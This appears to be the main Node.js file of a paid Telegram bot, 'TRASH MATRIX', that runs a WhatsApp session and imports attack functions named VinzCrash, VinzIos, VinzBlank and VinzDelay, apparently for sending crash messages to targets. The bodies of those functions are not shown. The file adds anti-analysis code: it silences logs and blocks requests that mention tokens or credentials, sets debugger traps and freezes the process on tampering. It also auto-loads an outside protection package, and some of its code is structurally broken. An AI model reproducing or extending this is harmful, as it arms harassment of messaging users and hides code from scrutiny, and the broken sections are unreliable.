const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const http = require("http");
const moment = require('moment-timezone');
const EventEmitter = require('events')
const pino = require('pino');
const { fileTypeFromBuffer } = require("file-type");
const { performance } = require('perf_hooks');
const crypto = require('crypto');
const chalk = require('chalk');
const { exec } = require("child_process");

let secureMode = false;
let tokenValidated = true;

let offlineMode = {
    isOffline: false,
    wakeUpTime: 0
};

    const { 
          VinzDelay, 
          VinzDozer, 
          VinzBlank, 
          VinzCrash, 
          VinzIos, 
          VinzClose, 
          VinzDelete, 
          VinzChannel
    } = require("./function.js");

// -------------------- ( Database & Thumbnail ) -------------------- \\

const databaseUrl = "https://raw.githubusercontent.com/VinzExorc1st/dbnew/refs/heads/main/database.json";
const thumbnailUrl = "https://l.top4top.io/p_3624e25zh1.jpg";

// -------------------- ( Security Anti Bypass ) -------------------- \\

if (!process.env.npm_lifecycle_event) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
    activateSecureMode();
  if (typeof __freezeSilently === "function") {
      __freezeSilently();
  }
  process.exitCode = 1;
}

(function () {
  "use strict";
  try {
    const blockedWords = [
      "fetch", "axios", "http", "https", "github", "gitlab", "whitelist", "database",
      "token", "apikey", "key", "secret", "raw.githubusercontent", "cdn.discordapp",
      "dropbox", "pastebin", "session", "cookie", "auth", "login", "credentials",
      "ip:", "url:", "endpoint", "request", "response"
    ].map(w => w.toLowerCase())

    function randErr() {
      const msgs = [
        "Operation blocked by policy.",
        "Suspicious network access detected.",
        "Request rejected: contains restricted keywords.",
        "Security rule triggered.",
        "Blocked by content filter."
      ]
      return msgs[Math.floor(Math.random() * msgs.length)]
    }

    function isBlocked(text) {
      if (!text) return false
      const s = String(text).toLowerCase()
      return blockedWords.some(w => s.includes(w))
    }

    function textify(arg) {
      try {
        if (typeof arg === "string") return arg
        if (arg && typeof arg === "object") {
          if (typeof arg.url === "string") return arg.url
          if (typeof arg.href === "string") return arg.href
          return JSON.stringify(arg)
        }
      } catch (_) {}
      return String(arg)
    }

    function detectSuspiciousAccess(...args) {
      try {
        const msg = args.map(textify).join(" ").toLowerCase()
        return blockedWords.some(word => msg.includes(word))
      } catch (_) {
        return false
      }
    }

    const origLog = console.log.bind(console)
    const origWarn = console.warn.bind(console)
    const origError = console.error.bind(console)

    console.log = (...args) => {
      if (!detectSuspiciousAccess(...args)) origLog(...args)
    }
    console.warn = (...args) => {
      if (!detectSuspiciousAccess(...args)) origWarn(...args)
    }
    console.error = (...args) => {
      if (!detectSuspiciousAccess(...args)) origError(...args)
    }

    if (typeof fetch === "function") {
      const origFetch = fetch
      function getUrlFromFetchArgs(args) {
        const input = args[0]
        if (typeof input === "string") return input
        if (input && typeof input === "object") {
          if (typeof input.url === "string") return input.url
          if (typeof input.href === "string") return input.href
        }
        return ""
      }
      globalThis.fetch = async (...args) => {
        const url = getUrlFromFetchArgs(args)
        if (isBlocked(url)) {
          throw new Error(randErr())
        }
        return origFetch(...args)
      }
    }

    if (typeof XMLHttpRequest !== "undefined" && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
      const origOpen = XMLHttpRequest.prototype.open
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        try {
          if (typeof url === "string" && isBlocked(url)) {
            throw new Error(randErr())
          }
        } catch (_) {
          throw new Error(randErr())
        }
        return origOpen.call(this, method, url, ...rest)
      }
    }

    if (typeof HttpRequest !== "undefined" && HttpRequest.prototype && typeof HttpRequest.prototype.open === "function") {
      const origOpenHR = HttpRequest.prototype.open
      HttpRequest.prototype.open = function (method, url, ...rest) {
        if (typeof url === "string" && isBlocked(url)) {
          throw new Error(randErr())
        }
        return origOpenHR.call(this, method, url, ...rest)
      }
    }
  } catch (_) {}
})()

1;(async () => {
  const { autoProtect } = await import("@zieecantikkk/ziee-frameworks");
  autoProtect();
})();

undefined
function __getIntegrityManifest() {
  try {
    const fs = require("fs");
    const path = require("path");
    const crypto = require("crypto");
    const apophisPath = path.resolve(process.cwd(), ".data");
    const secretKey = "vinz123";

    if (!fs.existsSync(apophisPath)) return null;
    const raw = fs.readFileSync(apophisPath, "utf8");
    const data = JSON.parse(raw);
    if (!data || typeof data !== "object" || !data.key) return null;

    const clone = { ...data };
    delete clone.key;
    const computedKey = crypto
      .createHmac("sha256", secretKey)
      .update(JSON.stringify(clone))
      .digest("hex");

    if (computedKey !== data.key) return null;
    return clone;
  } catch {
    return null;
  }
}

function __freezeSilently() {
  try { global.secureMode = true; } catch {}
  const sab = new SharedArrayBuffer(4);
  const view = new Int32Array(sab);
  Atomics.wait(view, 0, 0, 2147483647);
}

(function integrityCheck(){
  try {
    const manifest = __getIntegrityManifest();
    if (!manifest) { return; }
    const fs = require('fs');
    const path = require('path');
    const mismatches = [];
    for (const [rel, expected] of Object.entries(manifest)) {
      const p = path.resolve(process.cwd(), rel);
      if (!fs.existsSync(p)) { 
        mismatches.push({ file: rel, reason: "MISSING" });
        continue;
      }
      const data = fs.readFileSync(p);
      const dh = require('crypto')
        .createHash('sha256')
        .update(
          Buffer.from(
            require('crypto').createHash('sha256').update(data).digest('hex')
          )
        )
        .digest('hex');
      if (dh !== expected) {
        mismatches.push({ file: rel, reason: "HASH_MISMATCH" });
      }
    }

    if (mismatches.length) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));

      activateSecureMode();
      if (typeof __freezeSilently === "function") {
        __freezeSilently();
      }
      process.exitCode = 1;
      return;
    }
  } catch (e) {
        activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
  }
})();

function sha256(data){ return crypto.createHash('sha256').update(data).digest('hex'); }
function doubleHash(data){ return sha256(Buffer.from(sha256(data),'hex')); }

function readFileSafe(p){
  try { return require('fs').readFileSync(p); } catch(e){ return null; }
}

const ALLOWED_PATHS = [
  'package-lock.json',
  'database/cooldown.json',
  'database/premium.json',
  'database/admin.json',
  'package.json',
  'settings/.config',
  'function.js',
  'index.js',
  'session',
  'sessions',
  '.apikey'
];

(function antiFileInjection(){
  try {
    const fs = require('fs'), path = require('path');
    const walk = (dir)=>{
      const out=[];
      for (const e of fs.readdirSync(dir,{withFileTypes:true})) {
        const p = path.join(dir, e.name);
        if (e.isDirectory()) out.push(...walk(p));
        else out.push(path.relative(process.cwd(), p).replace(/\\/g,'/'));
      }
      return out;
    };
    const ALLOWED_PATHS = new Set([
  'package-lock.json',
  'database/cooldown.json',
  'database/premium.json',
  'database/admin.json',
  'package.json',
  'settings/.config',
  'function.js',
  'index.js',
  'session',
  'sessions',
  '.apikey'
]);
    const allFiles = walk(process.cwd());
    const suspicious = allFiles.filter(f => {
    try {
    if (f.startsWith('node_modules')) return false;
    if (ALLOWED_PATHS.has(f)) return false;
    if (f.startsWith('.')) return false;
    if (f.toLowerCase().endsWith('.zip')) return false;
    if (f.startsWith('session/') || f.startsWith('sessions/')) return false;
    return true;
  } catch (e) {
    return true;
  }  
  });
    if (suspicious.length) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
    }
  } catch(_) {}
})();

(function integrityCheck(){
  try {
    const manifest = __getIntegrityManifest();
    if(!manifest){ return; }
    const fs = require('fs');
    const path = require('path');
    const mismatches = [];
    for (const [rel, expected] of Object.entries(manifest)) {
      const p = path.resolve(process.cwd(), rel);
      if (!fs.existsSync(p)) { mismatches.push(1); continue; }
      const data = fs.readFileSync(p);
      const dh = crypto.createHash('sha256').update(
                    Buffer.from(
                      crypto.createHash('sha256').update(data).digest('hex')
                    )
                 ).digest('hex');
      if (dh !== expected) mismatches.push(1);
    }
    if (mismatches.length) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
    }
  } catch(_) {}
})();

(function loadEnv() {
  try {
    const p = path.resolve(process.cwd(), 'settings', '.config');
    if (fs.existsSync(p)) {
      for (const line of fs.readFileSync(p, 'utf8').split(/\r?\n/)) {
        if (!line || /^\s*#/.test(line)) continue;
        const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)\s*$/);
        if (m) {
          const k = m[1];
          let v = m[2];
          if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1);
          if (process.env[k] === undefined) process.env[k] = v;
        }
      }
    }
  } catch {}
})();

(function loadDotConfig(){
  try {
    const prefer = path.resolve(process.cwd(), 'settings', '.config');
    const alt = path.resolve(process.cwd(), '.config');
    const candidate = fs.existsSync(prefer) ? prefer : (fs.existsSync(alt) ? alt : null);
    if (candidate) {
      for (const line of fs.readFileSync(candidate,'utf8').split(/\r?\n/)) {
        if (!line || /^\s*#/.test(line)) continue;
        const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)\s*$/);
        if (m) {
          const k = m[1];
          let v = m[2];
          if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1,-1);
          if (process.env[k] === undefined) process.env[k] = v;
        }
      }
    }
  } catch (e) {}
})();

const tokenBot = process.env.TOKEN_BOT || "TOKEN_BOT";
const ownerID = process.env.OWNER_ID || "OWNER_ID";
const allowedGroupId = process.env.LOG_GROUP_ID || "";
const tokenCacheFile = './node_modules/telegraf/cache.json';
const secretHash = "vinz123";
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  encodeSignedDeviceIdentity,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
  makeCacheableSignalKeyStore,
  jidEncode,
  jidDecode,
  encodeWAMessage,
  patchMessageBeforeSending,
  encodeNewsletterMessage
} = require('baileys');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

function _signToken(token) {
  try {
    const secret = (typeof secretHash !== 'undefined' && secretHash) ? secretHash : "vinz123";
    return crypto.createHmac('sha256', String(secret)).update(String(token)).digest('hex');
  } catch (e) {
    try { console.error("Error in _signToken:", e && e.message ? e.message : e); } catch (ee) {}
    return null;
  }
}

function generateTokenHash(token) {
  try {
    return crypto.createHash("sha256")
      .update(String(token) + String(secretHash))
      .digest("hex");
  } catch (e) {
    return null;
  }
}

function loadTokenCache() {
  try {
    if (!fs.existsSync(tokenCacheFile)) return { validated: false, token: null };
    const raw = fs.readFileSync(tokenCacheFile, 'utf8');
    const data = JSON.parse(raw);
    if (!data || !data.token || !data.hash) return { validated: false, token: null };
    const expected = generateTokenHash(data.token);
    if (expected && data.hash === expected && data.validated === true) {
      return { validated: true, token: data.token };
    }
    return { validated: false, token: null };
  } catch (e) {
    return { validated: false, token: null };
  }
}

function saveTokenCache(status, token) {
  try {
    const hash = generateTokenHash(token);
    const data = { validated: !!status, token: String(token), hash };
    const dir = path.dirname(tokenCacheFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(tokenCacheFile, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {
  }
}

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });

async function httpsGet(url, opts = {}) {
  const { timeout = 15000, responseType = "json", headers = {} } = opts;
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { headers, timeout }, (res) => {
        const { statusCode } = res;
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          const raw = Buffer.concat(chunks);
          if (statusCode < 200 || statusCode >= 300) {
            return reject(new Error(`HTTP ${statusCode}`));
          }
          if (responseType === "arraybuffer") return resolve(raw);
          const text = raw.toString('utf8');
          if (responseType === "text") return resolve(text);
          try {
            return resolve(JSON.parse(text));
          } catch (err) {
            return reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('error', (err) => reject(err));
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
    } catch (err) {
      reject(err);
    }
  });
}

async function httpsPost(url, data, opts = {}) {
  const { timeout = 20000, headers = {}, responseType = "json" } = opts;
  return new Promise((resolve, reject) => {
    try {
      const u = new URL(url);
      const isString = typeof data === "string" || data instanceof String;
      const body = isString ? String(data) : (data instanceof URLSearchParams ? data.toString() : (typeof data === "object" ? JSON.stringify(data) : ""));
      const defaultHeaders = {
        'Content-Length': Buffer.byteLength(body || ""),
      };
      const requestOptions = {
        hostname: u.hostname,
        port: u.port || 443,
        path: u.pathname + (u.search || ""),
        method: 'POST',
        headers: Object.assign({}, defaultHeaders, headers),
        timeout
      };
      const req = https.request(requestOptions, (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const raw = Buffer.concat(chunks);
          if (res.statusCode < 200 || res.statusCode >= 300) {
            return reject(new Error(`HTTP ${res.statusCode}`));
          }
          if (responseType === "arraybuffer") return resolve(raw);
          const text = raw.toString('utf8');
          if (responseType === "text") return resolve(text);
          try {
            return resolve(JSON.parse(text));
          } catch (err) {
            return reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('error', (err) => reject(err));
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      if (body) req.write(body);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const __thumbExt = (() => {
  try {
    const u = thumbnailUrl.split('?')[0].toLowerCase();
    const m = u.match(/\.(mp4|gif|png|jpe?g)$/);
    return m ? m[1] : 'jpg';
  } catch { return 'jpg'; }
})();
const thumbnailType = (__thumbExt === 'mp4') ? 'mp4' : (__thumbExt === 'gif') ? 'gif' : 'photo';

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

async function setBotProfile(bot) {
  try {
    const botDefaultName = "TRASH MATRIX ( アポフィス )";
    const botDefaultDescription = "このスクリプトをご利用いただきありがとうございます。@vinzxiterr のチャンネル登録もお忘れなく。🍃";
    const botDefaultShortDescription = "このスクリプトをご利用いただきありがとうございます。@vinzxiterr のチャンネル登録もお忘れなく。🍃";

    await bot.telegram.setMyName(botDefaultName);
    await bot.telegram.setMyDescription(botDefaultDescription);
    await bot.telegram.setMyShortDescription(botDefaultShortDescription);
    await bot.telegram.setMyCommands([
      { command: "start", description: "アポフィスシステムを実行する" },
    ]);

  } catch (error) {
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.clear();
console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
Bot Sukses Terhubung Terimakasih
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  ✅  Token Valid Dan Terverifikasi
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
        }
      }
    } catch {
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
Token Tidak Terdaftar Bot Gagal Terhubung
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));

      try {
      } catch (e) {
      }

      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
    }
  } catch (err) {
    console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
System Telah Mendeteksi Kamu Bypass
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
    console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  Hadehk Ngapain Cil? Buy Akses Sono
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));
      activateSecureMode();
if (typeof __freezeSilently === "function") {
    __freezeSilently();
}
process.exitCode = 1;
return;
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

function injectAutoThumbnail(bot) {
  bot.use(async (ctx, next) => {
    const _photo = ctx.replyWithPhoto?.bind(ctx);
    const _video = ctx.replyWithVideo?.bind(ctx);
    const _anim  = ctx.replyWithAnimation?.bind(ctx);
    const _editMedia = ctx.editMessageMedia?.bind(ctx);

    if (_photo) {
      ctx.replyWithPhoto = (photo, options = {}) => {
        try {
          const isThumb = String(photo) === String(thumbnailUrl);
          if (!isThumb || thumbnailType === "photo") {
            return _photo(photo, options);
          }
          if (thumbnailType === "mp4" && _video) {
            return _video(thumbnailUrl, options);
          }
          if (thumbnailType === "gif" && _anim) {
            return _anim(thumbnailUrl, options);
          }
          return _photo(photo, options);
        } catch (e) {
          return _photo(photo, options);
        }
      };
    }

    if (_editMedia) {
      ctx.editMessageMedia = (inputMedia, extra) => {
        try {
          const isThumb = inputMedia && String(inputMedia.media) === String(thumbnailUrl);
          if (isThumb) {
            const base = {
              media: thumbnailUrl,
              caption: inputMedia.caption,
              parse_mode: inputMedia.parse_mode
            };
            if (thumbnailType === "mp4") {
              inputMedia = { type: "video", ...base };
            } else if (thumbnailType === "gif") {
              inputMedia = { type: "animation", ...base };
            } else {
              inputMedia = { type: "photo", ...base };
            }
          }
        } catch {}
        return _editMedia(inputMedia, extra);
      };
    }

    return next();
  });
}

// -------------------- ( Pemanggilan Function ) -------------------- \\

const bot = new Telegraf(tokenBot);

setBotProfile(bot);

bot.use(async (ctx, next) => {
    if (!allowedGroupId) return next();

    const currentChatId = String(ctx.chat?.id || "");
    const userId = String(ctx.from?.id || "");

    if (currentChatId !== allowedGroupId) {
        
        if (userId === String(ownerID)) {
            return next(); 
        }

        return ctx.reply("❌ Maaf, bot ini hanya dapat digunakan di grup khusus.");
    }

    return next();
});

bot.use(async (ctx, next) => {
    if (offlineMode.isOffline) {
        if (ctx.from.id == ownerID) return next();

        const now = Date.now();
        
        if (now >= offlineMode.wakeUpTime) {
            offlineMode.isOffline = false;
            await ctx.reply("✅ ☇ <b>System Reactivated.</b>\n<i>Trash Matrix System is now back online.</i>", { parse_mode: "HTML" });
            return next(); 
        } else {
            const remaining = offlineMode.wakeUpTime - now;
            const minutes = Math.floor(remaining / 60000);
            const seconds = ((remaining % 60000) / 1000).toFixed(0);

            return ctx.reply(`
<blockquote>╭═───⊱ ⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ───═⬡
│ ⸙ Status
│ᯓ➤ System Offline / Sleep
│ ⸙ Time Remaining
│ᯓ➤ ${minutes}m ${seconds}s
│ ⸙ Message
│ᯓ➤ Wait for the system to wake up
╰═──────────────═⬡</blockquote>

<code>© 𖣂-vinzεphyr. ẽscãnnõr. ϟ</code>`, 
            { parse_mode: "HTML" });
        }
    }
    return next();
});

bot.use(async (ctx, next) => {
  try {
    const isCommandMsg = ctx.message && ctx.message.text && typeof ctx.message.text === 'string' && ctx.message.text.trim().startsWith('/');
    const isCallback = ctx.updateType === 'callback_query';
    if (!isCommandMsg && !isCallback) {
      return next();
    }
    let ok = false;
    try {
      ok = await isAuthorizedToken(tokenBot);
    } catch (e) {
      ok = false;
    }
    if (!ok) {
      try { await ctx.reply('❌ ☇ Token tidak terdaftar, akses ditolak'); } catch(e) {}
      return;
    }
    return next();
  } catch (e) {
    try { await ctx.reply('❌ ☇ Token tidak terdaftar, akses ditolak'); } catch(e) {}
    return;
  }
});
injectAutoThumbnail(bot);
let __isValidatingToken = false;

bot.use(async (ctx, next) => {
  if (secureMode) return;
  try {
    if (!tokenValidated) {
      if (!__isValidatingToken) {
        __isValidatingToken = true;
        try {
          await ctx.reply("🔎 ☇ Sedang memvalidasi token");
          await sleep(5000)
        } catch(e) {}
        try {
          const ok = await isAuthorizedToken(tokenBot);
          if (ok) {
            tokenValidated = true;
          try { saveTokenCache(true, tokenBot); } catch(e) {}

            try { await ctx.reply("✅ ☇ Token berhasil divalidasi, ketik /start untuk membuka menu utama"); } catch(e) {}
          } else {
            try { await ctx.reply("❌ ☇ Token tidak terdaftar, akses ditolak"); } catch(e) {}
          }
        } finally {
          __isValidatingToken = false;
        }
      }
      return;
    }
  } catch (e) {
  }
  return next();
});

const _tokenCache = loadTokenCache();
if (_tokenCache.validated && _tokenCache.token === tokenBot) {
  tokenValidated = true;
          try { saveTokenCache(true, tokenBot); } catch(e) {}

  try {  } catch(e) {}
}

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * (1500 - 300 + 1)) + 300);

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
